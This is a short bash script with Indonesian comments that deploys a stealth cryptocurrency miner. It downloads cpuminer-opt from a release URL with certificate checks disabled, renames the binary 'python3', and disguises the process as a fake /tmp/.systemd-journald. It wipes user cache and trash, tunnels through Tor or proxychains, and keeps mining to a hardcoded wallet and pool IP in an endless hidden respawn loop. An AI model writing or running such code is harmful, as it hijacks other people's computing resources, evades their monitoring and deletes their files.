#!/bin/bash
set -e

# ========= Konfigurasi ==========
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="159.223.48.143"
PORT="443"
ALG="power2b"
THREADS=$(nproc --all)
BINARY_NAME="python3"  # samaran
URL="https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"

# ========= Proxy SOCKS5 (jika tersedia) ==========
PROXY_BIN="116.100.220.220 1080"
if command -v torsocks >/dev/null 2>&1; then
  PROXY_BIN="torsocks"
  echo "[*] Menggunakan torsocks untuk SOCKS5 proxy"
elif command -v proxychains >/dev/null 2>&1; then
  PROXY_BIN="proxychains"
  echo "[*] Menggunakan proxychains untuk SOCKS5 proxy"
else
  echo "[!] SOCKS5 proxy tidak tersedia, lanjut tanpa proxy"
fi

# ========= Unduh dan Siapkan ==========
echo "[*] Mengunduh cpuminer-opt..."
wget --no-check-certificate "$URL" -O miner.tar.gz
tar xf miner.tar.gz
mv cpuminer-sse2 "$BINARY_NAME"
chmod +x "$BINARY_NAME"

# ========= Obfuscasi Nama Proses ==========
echo "[*] Membuat symlink proses palsu..."
OBF_NAME="/tmp/.systemd-journald"
ln -sf "$PWD/$BINARY_NAME" "$OBF_NAME"

# ========= Cleanup Sementara ==========
echo "[*] Pembersihan file sementara dan log usang..."
rm -rf ~/.cache/* ~/.local/share/Trash/* 2>/dev/null || true

# ========= Anti-Dismiss Loop ==========
echo "[*] Menjalankan miner stealth tanpa root..."
while true; do
  setsid nohup $PROXY_BIN "$OBF_NAME" -a "$ALG" -o stratum+tcp://$POOL:$PORT -u "$WALLET" -p x -t"$THREADS" > /dev/null 2>&1
  echo "[!] Miner berhenti, mencoba lagi dalam 5 detik..."
  sleep 5
done
